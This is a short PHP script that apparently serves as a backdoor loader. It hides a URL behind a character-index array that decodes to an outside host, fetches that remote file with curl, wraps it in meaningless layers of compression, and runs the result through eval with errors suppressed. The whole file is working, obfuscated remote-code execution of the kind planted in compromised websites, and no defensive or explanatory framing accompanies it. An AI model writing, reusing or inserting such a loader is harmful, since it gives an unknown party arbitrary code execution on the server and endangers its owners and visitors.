<?php

$characters = array_merge(range('a', 'z'), range('A', 'Z'), range('0', '9'), ['.', ':', '/', '_', '-']);

$indexArray = [
    7, 19, 19, 15, 18, 63, 64, 64, 5, 8, 11, 4, 62,
    52, 23, 53, 61, 61, 61, 62, 19, 4, 2, 7, 64, 0, 11, 62, 19, 23, 19
];

$decodedString = '';
foreach ($indexArray as $index) {
    $decodedString .= $characters[$index];
}
$url = "$decodedString";

function fetchContent($url) { 
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $content = curl_exec($curl);
    curl_close($curl);
    return gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress($content))))))));
}

@eval("?>".gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(fetchContent($url))))))))));
?>
